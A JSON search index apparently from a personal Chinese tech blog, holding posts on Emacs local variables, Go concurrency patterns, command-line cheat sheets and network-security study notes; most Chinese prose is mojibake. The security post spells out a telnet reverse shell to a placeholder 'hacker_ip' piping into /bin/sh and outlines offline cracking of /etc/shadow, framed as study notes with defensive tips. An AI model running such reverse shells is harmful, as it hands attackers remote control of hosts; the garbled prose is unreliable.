æ¥å¯ç”¨æˆ–å…³é—­ minor modeã€‚ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ï¼Œä¼šæ‰“å¼€ eldoc-mode, å¹¶å…³é—­ font-lock-modeï¼š\n1 2 3 4 ;; Local Variables: ;; eval: (eldoc-mode) ;; eval: (font-lock-mode -1) ;; End: æœ€åï¼Œå¦‚æœä½ é€šè¿‡å‘½ä»¤åšäº†ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„é…ç½®ï¼Œæƒ³å¤åŸçš„è¯ï¼Œå¯ä»¥é€šè¿‡ M-x normal-mode å‘½ä»¤æ¥æ ¹æ®æ–‡ä»¶åï¼Œä»¥åŠæ–‡ä»¶å†…å®¹ï¼Œé‡ç½®æœ¬åœ°å˜é‡å’Œ major mode è®¾ç½®ã€‚\nå®‰å…¨æ€§é—®é¢˜ ç”±äºåŠ è½½æœ¬åœ°å˜é‡å­˜åœ¨ä¸€å®šçš„å®‰å…¨éšæ‚£ï¼Œæ‰€ä»¥é™¤éæ˜¯ä¸€äº› Emacs è®¤ä¸ºæ˜¯å®‰å…¨çš„ å˜é‡ï¼Œå¦åˆ™ Emacs å°†å‘ä½ ç¡®è®¤æ˜¯å¦æ‰§è¡Œã€‚\nå½“ç„¶ï¼Œä½ å¯ä»¥é€šè¿‡ä¸€äº›é…ç½®æ¥æŒ‡å®šä½ è®¤ä¸ºæ˜¯å®‰å…¨çš„å˜é‡æˆ–è€…å‘½ä»¤ï¼Œè¯¦æƒ…è¯·å‚è€ƒ Safe-File-Variables ã€‚\n","description":"","tags":["emacs","elisp","tools"],"title":"Emacs çš„æœ¬åœ°å˜é‡ (Local Variables)","uri":"/posts/emacs-local-variables/"},{"categories":null,"content":"Go çš„å¹¶å‘å“²å­¦ Donâ€™t Communicate by sharing memory, share memory by communicating.\nä¸è¦é€šè¿‡å…±äº«å†…å­˜æ¥é€šä¿¡ï¼›ç›¸åï¼Œé€šè¿‡é€šä¿¡æ¥å…±äº«å†…å­˜ã€‚\nGenerator å‘ç”Ÿå™¨ Generator æŒ‡è¿”å›ä¸€ä¸ª chan çš„å‡½æ•°ã€‚è¿™æ˜¯ä¸€ç§ååˆ†å¸¸è§çš„ä½¿ç”¨ goroutine + chan çš„æ–¹å¼ï¼Œå¯ä»¥è¯´æ˜¯ä¸€ç§æ ‡å‡†ç”¨æ³•äº†ã€‚\né‡‡ç”¨è¿™ç§æ–¹å¼ä½¿ç”¨ chan ååˆ†çš„å®‰å…¨ï¼Œä¸ä¼šå‡ºç°ä¸€äº› chan è¯¯ç”¨å¯¼è‡´çš„é”™è¯¯ï¼ˆä¾‹å¦‚å‘å·²ç»å…³é—­çš„ chan å†™å…¥æ•°æ®ç­‰ï¼‰ã€‚\nä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼Œä¼šå¼€ä¸€ä¸ª goroutine é€’å½’éå†æŒ‡å®šç›®å½•ï¼Œå¹¶å°†ç›®å½•ä¸‹çš„æ‰€æœ‰ json æ–‡ä»¶é€šè¿‡ chan åå‡ºå»ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 func walkJsonFiles(dir string) \u003c-chan string { out := make(chan string) go func() { defer close(out) err := filepath.WalkDir(dir, func(path string, info fs.DirEntry, err error) error { if err != nil { log.Printf(\"can't access path: %q: %v\\n\", path, err) return err } if !info.Type().IsDir() \u0026\u0026 filepath.Ext(path) == \".json\" { out \u003c- path } return nil }) if err != nil { log.Printf(\"error walking the path %q: %v\\n\", dir, err) return } }() return out } Multiplexing å¤šè·¯å¤ç”¨ï¼ˆFan-Inï¼‰ ä¸‹é¢è¿™å¼ å›¾å¯ä»¥å½¢è±¡çš„è¡¨è¾¾ Fan-In çš„æ¦‚å¿µï¼š\nFan-In: å¤š goroutine ç‰ˆæœ¬ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 func fanIn(cs ...\u003c-chan string) \u003c-chan string { out := make(chan string) var wg sync.WaitGroup // æ³¨æ„ï¼šè¿™é‡Œä¸èƒ½ç›´æ¥ wg.Wait()ï¼Œéœ€è¦å¼€ä¸€ä¸ª goroutine æ¥ Wait defer func() { go func() { wg.Wait() close(out) }() }() collect := func(in \u003c-chan string) { defer wg.Done() for n := range in { out \u003c- n } } wg.Add(len(cs)) // Fan-In for _, c := range cs { go collect(c) } return out } Fan-In: select ç‰ˆæœ¬ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 func fanInUsingSelect(input1, input2 \u003c-chan string) \u003c-chan string { out := make(chan string) go func() { defer close(out) for { select { case x, ok := \u003c-input1: if !ok { input1 = nil } else { out \u003c- x } case x, ok := \u003c-input2: if !ok { input2 = nil } else { out \u003c- x } } if input1 == nil \u0026\u0026 input2 == nil { break } } }() return out } Fan-Out Fan-Out åˆšå¥½å’Œ Fan-In ç›¸åï¼Œä¸€èˆ¬å’Œ Fan-In é…åˆèµ·æ¥ä¸€èµ·ä½¿ç”¨ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 func processJsonFiles(ch \u003c-chan string) \u003c-chan string { out := make(chan string) go func() { defer close(out) for s := range ch { // do something useful ... out \u003c- s + \" done\" } }() return out } func fanOut(in \u003c-chan string) \u003c-chan string { // åŒæ—¶å¼€ n ä¸ª goroutine æ¥å¤„ç†è¿™äº› json files n := 20 cs := make([]\u003c-chan string, n) for i := 0; i \u003c n; i++ { cs[i] = processJsonFiles(in) } out := fanIn(cs...) return out } func main() { ch := walkJsonFiles(\"./\") out := fanOut(ch) for s := range out { fmt.Println(s) } } select å®ç° Timeout 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 package main import ( \"fmt\" \"time\" ) // ä¸ºæ¯æ¬¡ select è®¾ç½®è¶…æ—¶ // æ¯æ¬¡ select éƒ½ä¼šé‡ç½®è¶…æ—¶ func selectTimeout(in \u003c-chan string) { for { select { case s := \u003c-in: fmt.Println(\"tick\", s) case \u003c- time.After(1 * time.Second): fmt.Println(\"You're too slow.\") return } } } // ä¸ºæ•´ä¸ª for å¾ªç¯è®¾ç½®ä¸€ä¸ªè¶…æ—¶ï¼Œæ—¶é—´ç»“æŸå³é€€å‡º func selectTimeout2(in \u003c-chan string) { timeout := time.After(1 * time.Second) for { select { case s := \u003c-in: fmt.Println(\"tock\", s) case \u003c- timeout: fmt.Println(\"timed out\") return } } } func main() { in := make(chan string) go func() { for i := 0; i \u003c 20; i++ { time.Sleep(time.Duration(i * 200) * time.Millisecond) in \u003c- fmt.Sprintf(\"%d\", i) } }() go selectTimeout2(in) selectTimeout(in) } è¾“å‡ºå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 tick 0 tock 1 tick 2 timed out tick 3 tick 4 You're too slow. ä¼˜é›…çš„é€€å‡º (quit chan) ç”±äº chan å¯ä»¥è¿›è¡ŒåŒå‘é€šä¿¡ï¼ˆround-trip communicationï¼‰ï¼Œå› æ­¤ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å®ç°é€€å‡ºå‰çš„æ¸…ç†å·¥ä½œã€‚\nä¾‹å¦‚ï¼š\nA é€šçŸ¥ B é€€å‡º B æ”¶åˆ°é€€å‡ºæŒ‡ä»¤æ—¶ï¼Œæ‰§è¡Œæ¸…ç†åŠ¨ä½œï¼Œå®Œæˆåå†é€šçŸ¥ A A æ”¶åˆ°é€šçŸ¥åï¼Œç»“æŸå®Œæ•´çš„é€€å‡ºæµç¨‹ ä»£ç ç¤ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 import ( \"fmt\" \"io/fs\" \"path/filepath\" \"errors\" ) func walkAndGracefulQuit(dir string, quit chan string) (\u003c-chan string, \u003c-chan bool) { out := make(chan string) done := make(chan bool) go func() { defer func() { close(out) cleanup() done \u003c- true }() filepath.WalkDir(dir, func(path string, info fs.DirEntry, err error) error { if err != nil { fmt.Printf(\"can't access path: %q %v\\n\", path, err) return err } if !info.Type().IsDir() \u0026\u0026 filepath.Ext(path) == \".md\" { select { case out \u003c- path: // do nothing case \u003c-quit: return errors.New(\"quit\") } } return nil }) }() return out, done } func cleanup() { } func main() { quit := make(chan string) c, done := walkAndGracefulQuit(\".\", quit) i := 0 for name := range c { fmt.Println(name) // æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ–‡ä»¶åï¼Œç«‹å³é€€å‡º if i++; i == 1 { // è¿™é‡Œè¦ç”¨ goroutine åœ¨åå°å‘å°„é€€å‡ºä¿¡å·ï¼Œä»¥é˜²æ­¢ç›®å½•ä¸‹åªæœ‰ä¸€ä¸ª md æ–‡ // ä»¶æ—¶ï¼Œç”±äºæ²¡æœ‰æœºä¼šè¯» quit chan è€Œå‡ºç°æ­»é”ç°è±¡ã€‚å¦ä¸€ç§åšæ³•æ˜¯ï¼Œåˆ©ç”¨ // select æ¥å‘å°„ï¼Œä½†æ²¡æœ‰ç”¨ goroutine è¿™ä¹ˆç®€å•å’Œç¨³å¦¥ã€‚ go func() { quit \u003c- \"bye\" }() } } // ç­‰å¾…æ¸…ç†åŠ¨ä½œå®Œæ¯•ï¼Œæ­£å¼ç»“æŸç¨‹åº \u003c-done } æ¡ˆä¾‹å­¦ä¹ ï¼šGoogle Search Go talks æœ‰ä¸€ä¸ªå¾ˆç»å…¸çš„æ¡ˆä¾‹ï¼Œè¿™é‡Œæˆ‘ä»¬å­¦ä¹ ä¸€ä¸‹ã€‚\nå‡è®¾ Google Search æœ‰ä¸‰ä¸ªåç«¯æœç´¢æœåŠ¡ï¼š\nWeb Search Image Search Video Search è¿™ä¸‰ä¸ªåˆ†åˆ«è´Ÿè´£æœç´¢ç½‘é¡µï¼Œå›¾ç‰‡å’Œè§†é¢‘ã€‚ç°åœ¨è¦æ•´åˆè¿™ä¸‰ä¸ªæœåŠ¡ï¼Œå¯¹ç”¨æˆ·æä¾›å®Œæ•´çš„æœç´¢æœåŠ¡ã€‚\nSearch 1.0 æœ€ç®€å•å½¢æ€ï¼Œè½®æµè®¿é—®åç«¯æœåŠ¡ï¼Œæ— å¹¶å‘å®ç°ï¼š\n1 2 3 4 5 6 func Google(query string) (results []Result) { results = append(results, Web(query)) results = append(results, Image(query)) results = append(results, Video(query)) return } Search 2.0 æ— éœ€é”ã€æ¡ä»¶å˜é‡ã€å›è°ƒï¼Œå³å¯å®ç°å¹¶å‘æœç´¢ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 func Google(query string) (results []Result) { c := make(chan Result) go func() { c \u003c- Web(query) } () go func() { c \u003c- Image(query) } () go func() {c \u003c- Video(query) } () for i := 0; i \u003c 3; i++ { result := \u003c-c results = append(results, result) } return } Search 2.1 è®¾ç½®æœç´¢æœåŠ¡çš„è¶…æ—¶æ—¶é—´ï¼Œé¿å…è¢«åç«¯è¾ƒæ…¢çš„ï¼ˆæˆ–è€…å‡ºæ•…éšœçš„ï¼‰æœåŠ¡æ‹–å®ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func Google(query string) (results []Result) { c := make(chan Result) go func(){ c \u003c- Web(query) }() go func(){ c \u003c- Image(query) }() go func(){ c \u003c- Video(query) }() timeout := time.After(80 * time.Millisecond) for i := 0; i \u003c 3; i++ { select { case result := \u003c-c: results = append(results, result) case \u003c-timeout: fmt.Println(\"timed out\") return } } } Search 3.0 é€šè¿‡åç«¯æœåŠ¡å¤šå¼€ï¼ˆreplicatedï¼‰ï¼Œé™ä½å°¾éƒ¨å»¶è¿Ÿï¼ˆtail latencyï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 func First(query string, replicas ...Search) Result { c := make(chan Result) searchReplica := func(i int) { c \u003c- replicas[i](query) } for i := range replicas { go searchReplica(i) } return \u003c-c } func Google(query string) (results []Result) { c := make(chan Result) go func() { c \u003c- First(query, Web1, Web2) } () go func() { c \u003c- First(query, Image1, Image2) } () go func() { c \u003c- First(query, Video1, Video2) } () timeout := time.After(80 * time.Millisecond) for i := 0; i \u003c 3; i++ { select { case result := \u003c-c: results = append(results, result) case \u003c-timeout: fmt.Println(\"timed out\") return } } return } å‚è€ƒèµ„æ–™ Go Concurrency Patterns - slide Go Concurrency Patterns - source code of slide ","description":"","tags":["golang","concurrency"],"title":"Go å¹¶å‘æ¨¡å¼æ€»ç»“","uri":"/posts/go-concurrency-patterns/"},{"categories":null,"content":"VSCode æœ‰ä¸€ä¸ªæ¯”è¾ƒæ–¹ä¾¿çš„å¿«æ·é”®ï¼šCtrl-` ï¼Œå¯ä»¥ä¸€é”®æ‹‰èµ· terminal ã€‚\nè¿™é‡Œåœ¨ Emacs ä¸­æ¨¡æ‹Ÿä¸€ä¸‹è¿™ä¸ªåŠŸèƒ½ï¼Œè€Œä¸”è¿˜æ˜¯å¢å¼ºç‰ˆæœ¬ï¼Œå¯ä»¥åœ¨ä¸åŒæ–‡ä»¶ä¸­æ‹‰ èµ·ä¸åŒçš„ terminalï¼Œæ‹‰èµ·çš„ terminal è·¯å¾„å’Œå½“å‰æ–‡ä»¶çš„ç›®å½•ä¸€è‡´ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ;; emacs è‡ªå¸¦çš„ term å‘½ä»¤åªæ”¯æŒå•ä¸ª terminalï¼Œå› æ­¤è¯¥åŠŸèƒ½ä¾èµ– ;; multi-term ã€‚è¿™é‡Œå…ˆæ£€æŸ¥æœ‰æ²¡æœ‰å®‰è£…ï¼Œæ²¡æœ‰çš„è¯å…ˆå®‰è£… multi-term (unless (package-installed-p 'multi-term) (package-install 'multi-term)) ;; å®šä¹‰æ‹‰èµ· multi-term çš„å‡½æ•°ï¼Œå¦‚æœå½“å‰ç›®å½•å·²ç»æ‹‰èµ·è¿‡ terminalï¼Œåˆ™ç›´æ¥ ;; è·³è½¬åˆ°è¯¥ terminalã€‚ç”±äºæˆ‘çš„å±å¹•æ¯”è¾ƒå®½ï¼Œè¿™é‡Œä¼šè‡ªåŠ¨å°† terminal åˆ†å±åˆ° ;; å³ä¾§ (defun open-or-jump-to-multi-term () (interactive) (if (string-prefix-p \"*terminal\u003c\" (buffer-name)) (delete-window) (progn (setq bufname (concat \"*terminal\u003c\" (directory-file-name (file-name-directory (buffer-file-name))) \"\u003e\")) (if (get-buffer-process bufname) (switch-to-buffer-other-window bufname) (progn (split-window-right) (other-window 1) (multi-term) (rename-buffer bufname) ) ))) ) ;; å®šä¹‰å¿«æ·é”®ï¼Œå’Œ VSCode ä¸€è‡´ (global-set-key (kbd \"C-`\") 'open-or-jump-to-multi-term) Emacs æœ€å¤§çš„é­…åŠ›ï¼Œä¹Ÿè®¸å°±æ˜¯å¯ä»¥æŒ‰ç…§è‡ªå·±çš„å–œå¥½ï¼Œéšå¿ƒå®šåˆ¶å„ç§åŠŸèƒ½å§ï¼å¦å¤– å„ç§æ–‡æœ¬ç¼–è¾‘çš„å¿«æ·é”®ï¼Œä¹Ÿæ˜¯è¶Šç”¨è¶Šé¡ºæ‰‹ã€‚\n","description":"","tags":["emacs","elisp","terminal","vscode","tools"],"title":"åœ¨ Emacs ä¸­å®ç° VSCode çš„ terminal å¿«æ·é”®åŠŸèƒ½","uri":"/posts/emacs-vscode-terminal/"},{"categories":null,"content":"è®°å½•ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œæ–¹ä¾¿éšæ—¶å–ç”¨ã€‚\ngit throught ssh 1 git remote add origin ssh://user@my.git.svr/path/to/repo é€šè¿‡ crontab å®ç°å¼€æœºè‡ªå¯åŠ¨ # æ¯æ¬¡ç³»ç»Ÿé‡å¯æ—¶ï¼Œéƒ½ä¼šè¿è¡Œ ss.sh @reboot ss.sh xxd åå…­è¿›åˆ¶ï¼ˆäºŒè¿›åˆ¶ï¼‰ dump xxd ä»¥åå…­è¿›åˆ¶å½¢å¼ dump æ–‡ä»¶å†…å®¹ xxd -b ä»¥äºŒè¿›åˆ¶å½¢å¼ dump æ–‡ä»¶å†…å®¹ xxd -r ä» dump å†…å®¹è¿˜åŸå‡ºåŸå§‹æ–‡ä»¶ï¼Œä¾‹å¦‚ xxd file | xxd -r å’Œ cat file çš„è¾“å‡ºæ˜¯ä¸€è‡´çš„ uniq è¿‡æ»¤ã€æŠ¥å‘Šç›¸åŒè¡Œ uniq ç›¸åŒè¡Œä»…æ‰“å°ä¸€æ¬¡ uniq -c è¡Œé¦–æ’å…¥è¯¥è¡Œé‡å¤å‡ºç°çš„æ¬¡æ•° uniq -d ä»…è¾“å‡ºç›¸åŒè¡Œ uniq -u ä»…è¾“å‡ºä¸åŒè¡Œ æŸ¥çœ‹ç½‘ç»œç«¯å£ç›‘å¬æƒ…å†µ 1 netstat -tunlp æŸ¥çœ‹ CPU æ€»æ ¸å¿ƒæ•° 1 grep -c 'model name' /proc/cpuinfo find printable strings æŸ¥æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸² ä¾‹å¦‚æŸ¥çœ‹ /bin ç›®å½•ä¸‹çš„ç¨‹åºå¯èƒ½ä¼šåˆ›å»ºå“ªäº›ä¸´æ—¶æ–‡ä»¶:\n1 strings /bin/* | grep tmp æŸ¥çœ‹ã€é…ç½®èµ„æºé™åˆ¶ 1 ulimit -a 1 2 3 4 5 6 7 8 9 10 11 core file size (blocks, -c) 0 data seg size (kbytes, -d) unlimited file size (blocks, -f) unlimited max locked memory (kbytes, -l) unlimited max memory size (kbytes, -m) unlimited open files (-n) 1024 pipe size (512 bytes, -p) 1 stack size (kbytes, -s) 9788 cpu time (seconds, -t) unlimited max user processes (-u) 2784 virtual memory (kbytes, -v) unlimited æµ‹è¯•ç¡¬ç›˜é€Ÿåº¦ 1 2 3 4 5 # bs é»˜è®¤ä¸º 512 å­—èŠ‚ï¼Œå•ä½æ”¯æŒ k/m ï¼ˆmacOS å¹³å°å¦‚æ­¤ï¼ŒLinux ä¸Šä¸ä¸€æ ·ï¼‰ # write dd of=${path_on_disk} if=/dev/zero bs=1m count=1000 # read dd if=${path_on_disk} of=/dev/null bs=1m 1 2 3 4 5 6 1000+0 records in 1000+0 records out 1048576000 bytes transferred in 0.619836 secs (1691698844 bytes/sec) 1000+0 records in 1000+0 records out 1048576000 bytes transferred in 0.246972 secs (4245726816 bytes/sec) ç›‘æ§ç£ç›˜ IO æƒ…å†µ 1 iostat 1 2 3 disk0 disk2 disk3 cpu load average KB/t tps MB/s KB/t tps MB/s KB/t tps MB/s us sy id 1m 5m 15m 26.18 95 2.42 25.87 0 0.00 287.74 0 0.00 4 2 94 1.95 1.64 1.56 ä¸‹è½½è„šæœ¬å¹¶ç«‹å³æ‰§è¡Œ ä»¥ä¸‹å‘½ä»¤ä¼šè‡ªåŠ¨å®‰è£… yarn åŒ…ç®¡ç†å·¥å…·ï¼š\n1 curl --compressed -o- -L https://yarnpkg.com/install.sh | bash å‚æ•°è§£é‡Šï¼š\nâ€“compressed è¯·æ±‚å‹ç¼©æ–¹å¼ä¼ è¾“ï¼ŒèŠ‚çœæµé‡ã€æé«˜é€Ÿåº¦ -o- -o æŒ‡å®šä¿å­˜çš„æ–‡ä»¶è·¯å¾„ï¼Œå‚æ•°æŒ‡å®šä¸º - åˆ™å¼ºåˆ¶è¾“å‡ºåˆ° stdout -L è·Ÿéšé‡å®šå‘ ","description":"","tags":["tools","command","scripts","linux","macos"],"title":"å¸¸ç”¨å‘½ä»¤è¡Œå·¥å…·","uri":"/posts/cmd-line-tools/"},{"categories":null,"content":"è¸©ç‚¹ DNS zone transfer åŒºåŸŸä¼ é€ https://digi.ninja/projects/zonetransferme.php\nhttps://www.mi1k7ea.com/2021/04/03/æµ…æDNSåŸŸä¼ é€æ¼æ´/\n1 dig axfr @nsztm1.digi.ninja zonetransfer.me ç½‘ç»œæ‹“æ‰‘ 1 2 3 4 5 6 7 8 traceroute # -I: ICMP, -U: UDP, -T: TCP traceroute -I # tells the network to route the packet through the specified gateway # (most routers have disabled source routing for security reasons). traceroute -g 10.10.10.5 ping ä¸€èˆ¬é»˜è®¤èµ° ICMP åè®®ã€‚\nICMPï¼ˆInternet Control Message Protocolï¼Œäº’è”ç½‘æ§åˆ¶åè®®ï¼‰æ˜¯ç½‘ç»œå±‚åè®®ï¼Œä½†æ˜¯å®ƒä¸åƒ IP åè®®å’Œ ARP åè®®ä¸€æ ·ç›´æ¥ä¼ é€’ç»™æ•°æ®é“¾è·¯å±‚ï¼Œè€Œæ˜¯å…ˆå°è£…æˆ IP æ•°æ®åŒ…ç„¶åå†ä¼ é€’ç»™æ•°æ®é“¾è·¯å±‚ã€‚æ‰€ä»¥åœ¨ IP æ•°æ®åŒ…ä¸­å¦‚æœåè®®ç±»å‹å­—æ®µçš„å€¼æ˜¯ 1 çš„è¯ï¼Œå°±è¡¨ç¤º IP æ•°æ®æ˜¯ ICMP æŠ¥æ–‡ã€‚IP æ•°æ®åŒ…å°±æ˜¯é è¿™ä¸ªåè®®ç±»å‹å­—æ®µæ¥åŒºåˆ†ä¸åŒçš„æ•°æ®åŒ…çš„ã€‚\nåœ¨ IP é€šä¿¡ä¸­å¦‚æœæŸä¸ªåŒ…å› ä¸ºæœªçŸ¥åŸå› æ²¡æœ‰åˆ°è¾¾ç›®çš„åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸ªå…·ä½“çš„åŸå› å°±æ˜¯ç”± ICMP è´Ÿè´£å‘ŠçŸ¥ã€‚è€Œ ICMP åè®®çš„ç±»å‹å®šä¹‰ä¸­å°±æ¸…æ¥šçš„æè¿°äº†å„ç§æŠ¥æ–‡çš„å«ä¹‰ã€‚\næ‰«æ 1 2 3 4 sudo arp-scan 172.19.50.0/24 # ç«¯å£æ‰«æï¼Œ-Pn å¿½ç•¥ä¸»æœºå‘ç°ï¼Œé¿å… ICMP è¢«å±è”½ nmap -Pn 172.19.50.218 åè®®æ ˆæŒ‡çº¹åˆ†ææŠ€æœ¯ åè®®æ ˆæŒ‡çº¹åˆ†ææŠ€æœ¯ï¼šStack Fingerprintingï¼Œåˆ†ä¸»åŠ¨å¼ã€è¢«åŠ¨å¼ã€‚\né€šè¿‡æ£€æŸ¥åè®®æ ˆå…·ä½“å®ç°çš„ç»†å¾®å·®å¼‚ï¼Œä¾¦æµ‹ç›®æ ‡è®¾å¤‡çš„æ“ä½œç³»ç»Ÿã€‚\n1 2 # æ‰«æ OSï¼Œä¸»åŠ¨å¼ sudo nmap -O -Pn 192.168.1.1 æŸ¥ç‚¹ æœåŠ¡æŒ‡çº¹åˆ†ææŠ€æœ¯ 1 2 # æ£€æŸ¥æŸä¸ªæœåŠ¡çš„ç‰ˆæœ¬å· nmap -sV 192.168.1.1 -p 22 æ¼æ´æ‰«æå™¨ Nessus nmap script engine æ ‡è¯­æŠ“å–æŠ€æœ¯ è¿æ¥åˆ°è¿œç¨‹åº”ç”¨ç¨‹åºï¼Œå¹¶è§‚å¯Ÿå…¶è¾“å‡ºã€‚\n1 2 3 4 telnet www.example.com 80 # netcat, TCP/IP ç‘å£«å†›åˆ€ nc -v www.example.com 80 æ”»å‡» Unix è¿œç¨‹è®¿é—® ç¼“å†²åŒºæº¢å‡ºæ”»å‡» å †æ ˆç¼“å†²åŒºæº¢å‡º heap ç¼“å†²åŒºæº¢å‡º åå‘é€šé“ åœ¨è‡ªå·±çš„æœºå™¨ä¸Šæ‰“å¼€ nc ç›‘å¬å™¨ï¼Œæ¥å—åå‘çš„ telnet è¿æ¥ï¼› åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œ telnet å‘½ä»¤ï¼Œå»ºç«‹åå‘é€šé“ã€‚ Example 1ï¼š\n1 2 3 4 5 6 7 8 # è‡ªå·±çš„æœºå™¨ï¼Œè¿™ä¸ªç»ˆç«¯æ¥å— sh å‘½ä»¤è¾“å…¥ nc -l -n -v -p 80 # è‡ªå·±çš„æœºå™¨ï¼Œè¿™ä¸ªç»ˆç«¯ä¼šæ‰“å° sh æ ‡å‡†è¾“å‡º nc -l -n -v -p 25 # ç›®æ ‡æœºå™¨ /bin/telnet hacker_ip 80 | /bin/sh | /bin/telnet hacker_ip 25 Security Tips\nchmod 750 telnet ç¦æ­¢ä¸å¿…è¦æ‰§è¡Œ telnet çš„ç”¨æˆ·å»æ‰§è¡Œå®ƒã€‚\næœ¬åœ°è®¿é—® ç¦»çº¿å£ä»¤ç ´è§£ è·å– /etc/shadow æ–‡ä»¶\nMCF æ ¼å¼ï¼š$ç®—æ³•$salt$hash ï¼Œç®—æ³•1ï¼šMD5ï¼Œç®—æ³•2ï¼šBlowfish è®¡ç®— hash(salt+password) ï¼Œå’Œ shadow æ–‡ä»¶ä¸­çš„å€¼æ¯”è¾ƒï¼ŒåŒ¹é…åˆ™ç ´è§£æˆåŠŸ\nç ´è§£ç¨‹åºï¼šJohn the Ripperï¼ŒAKA: John, JTR\næœ¬åœ°ç¼“å†²åŒºæº¢å‡º ä¸€èˆ¬ä»¥ SUID å±æ€§çš„æ–‡ä»¶ä¸ºç›®æ ‡ï¼Œä»è€Œå…è®¸æ”»å‡»è€…ä»¥ root ç‰¹æƒæ‰§è¡Œå‘½ä»¤ã€‚\nå‚è€ƒï¼šLinux Tips\nSecurity Tips\nå°½é‡ä¸è¦è®¾ç½® SUID ä½ã€‚\n","description":"","tags":["network","security","tools"],"title":"ç½‘ç»œå®‰å…¨ Network Security","uri":"/posts/network-security/"},{"categories":null,"content":"è®°å½•ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œæ–¹ä¾¿éšæ—¶å–ç”¨ã€‚\nåŒ…ç®¡ç† Ubuntu/Debian ä¸ŠæŸ¥çœ‹ä¸€ä¸ªåŒ…çš„å®‰è£…äº†å“ªäº›æ–‡ä»¶ï¼Œå®‰è£…åˆ°å“ªé‡Œäº†ï¼š\nå…ˆç”¨ dpkg -l | grep vim æ‰¾åˆ°è¦æŸ¥çœ‹çš„åŒ…çš„å®Œæ•´åŒ…åï¼› å†é€šè¿‡åŒ…åæŸ¥çœ‹å®‰è£…çš„æ–‡ä»¶ï¼š dpkg -L neovim å°æŠ€å·§ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # æ›´å¥½çš„ export ç¯å¢ƒå˜é‡çš„æ–¹æ³•ï¼Œé¿å…å°†æ•æ„Ÿä¿¡æ¯æš´éœ²åœ¨å‘½ä»¤è¡Œå†å²è®°å½•ä¸­ export XXX_KEY=$(cat) # macOS è®¿é—®å‰ªè´´æ¿ï¼Œå°†æ–‡æœ¬å†™å…¥å‰ªè´´æ¿ echo hello | pbcopy # macOS è¯»å–å‰ªè´´æ¿ pbpaste # ç”Ÿæˆä¸€ä¸ª 32 å­—èŠ‚çš„ url safe çš„ secret key python3 -c 'import secrets; print(secrets.token_urlsafe(32))' # ç”Ÿæˆä¸€ä¸ª 32 å­—èŠ‚çš„ hex secret key python3 -c 'import secrets; print(secrets.token_hex(32))' Filesystem losetup 1 2 3 4 5 6 7 8 # bind the file test.img to loop device /dev/loop0 losetup /dev/loop0 test.img mkfs.ext4 /dev/loop0 mount -o discard /dev/loop0 /mnt # list all loop devices losetup -la Network Network Tools ç½‘ç»œå·¥å…·ç®± ã€‚\nfd 1 2 3 4 # æŸ¥æ‰¾å¤šç§æ‰©å±•å fd '.(java|kt)' fd '.(java|kt)' | xargs rg -U '\\bLiveStream\\s*\\(' -l rg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # -lï¼Œä»…æ‰“å°åŒ¹é…çš„æ–‡ä»¶åï¼Œå¿½ç•¥åŒ¹é…åˆ°çš„å†…å®¹ rg -l LiveStream # -vï¼Œåå‘åŒ¹é…ï¼ˆè¿‡æ»¤æ‰åŒ¹é…åˆ°çš„ï¼‰ rg -l LiveStream | rg -v getLiveStream # '\\b', åŒ¹é… word è¾¹ç•Œ rg -l '\\bLiveStream\\(' # '\\s', åŒ¹é…ç©ºç™½å­—ç¬¦ rg '\\bLiveStream\\s*\\(' # -U, åŒ¹é…å¤šè¡Œæ–‡æœ¬ rg -U '\\bLiveStream\\s*\\(' xargs xargs on Mac OSï¼š\n1 2 find . -iname something | xargs -I {} mv {} /dest/path find /tmp/ -ctime -1 -name \"x*\" | xargs -I '{}' mv '{}' ~/play/ Crontab 1 2 3 4 5 # æ¯ 10 åˆ†é’Ÿè¿è¡Œä¸€æ¬¡ */10 * * * * command # å¼€æœºè‡ªå¯åŠ¨ï¼šæ¯æ¬¡ç³»ç»Ÿé‡å¯æ—¶ï¼Œéƒ½ä¼šè¿è¡Œ ss.sh @reboot ss.sh å‚è€ƒï¼šhttps://crontab.guru/every-10-minutes\näºŒè¿›åˆ¶å·¥å…· äºŒè¿›åˆ¶ dump å·¥å…·\nxxd ä»¥åå…­è¿›åˆ¶å½¢å¼ dump æ–‡ä»¶å†…å®¹ xxd -b ä»¥äºŒè¿›åˆ¶å½¢å¼ dump æ–‡ä»¶å†…å®¹ xxd -r ä» dump å†…å®¹è¿˜åŸå‡ºåŸå§‹æ–‡ä»¶ï¼Œä¾‹å¦‚ xxd file | xxd -r å’Œ cat file 